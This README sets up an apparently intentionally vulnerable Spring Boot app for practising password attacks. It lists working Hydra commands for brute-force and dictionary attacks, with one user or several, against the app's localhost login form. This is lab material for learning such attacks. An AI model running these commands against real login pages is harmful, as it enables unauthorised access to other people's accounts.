# Hydra Victim example application

## Installation

### Hydra
```
brew install hydra
```

### SpringBoot
```
./mvnw spring-boot:run
```

## Attacks

### Brute force

#### With known failure
```
hydra -V -l admin -x 4:6:1a -s 8080 localhost http-form-post "/login:login=^USER^&passw=^PASS^:credentials"
```

#### With known success
```
hydra -V -l admin -x 4:6:1a -s 8080 localhost http-form-post "/login:login=^USER^&passw=^PASS^:S=logged"
```

### Dictionary
```
hydra -V -l administrator -P ./keyboard.txt -s 8080 localhost http-form-post "/login:login=^USER^&passw=^PASS^:Bad credentials"
```


### Dictionary with multiple users
```
hydra -V -u -L ./users.txt -P ./keyboard.txt -s 8080 localhost http-form-post "/login:login=^USER^&passw=^PASS^:Bad credentials"
```

## License
MIT